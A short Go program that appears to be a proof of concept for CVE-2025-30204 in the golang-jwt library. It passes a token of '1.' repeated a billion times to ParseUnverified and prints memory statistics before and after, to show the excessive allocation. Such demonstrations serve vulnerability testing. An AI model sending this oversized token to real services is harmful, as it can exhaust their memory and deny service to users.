package main

import (
	"fmt"
	"runtime"
	"strings"

	"github.com/golang-jwt/jwt/v4"
)

func bytesToMegabytes(bytes uint64) uint64 {
	return bytes / 1000 / 1000
}

func printMemStats() {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	fmt.Printf("Alloc = %v MB\n", bytesToMegabytes(m.Alloc))
	fmt.Printf("TotalAlloc = %v MB\n", bytesToMegabytes(m.TotalAlloc))
	fmt.Printf("Sys = %v MB\n", bytesToMegabytes(m.Sys))
	fmt.Printf("Mallocs = %v\n", m.Mallocs)
	fmt.Printf("NumGC = %v\n", m.NumGC)
}

func main() {
	parser := jwt.NewParser()

	fmt.Println("\n === Before ===")

	printMemStats()
	// CVE 2025-30204. https://nvd.nist.gov/vuln/detail/CVE-2025-30204
	token, parts, err := parser.ParseUnverified(strings.Repeat("1.", 1_000_000_000), jwt.MapClaims{})
	if err != nil {
		fmt.Println("\nfailed to parse token", err.Error())
	}

	fmt.Println("\n === After ===")
	printMemStats()

	_ = token
	_ = parts
}
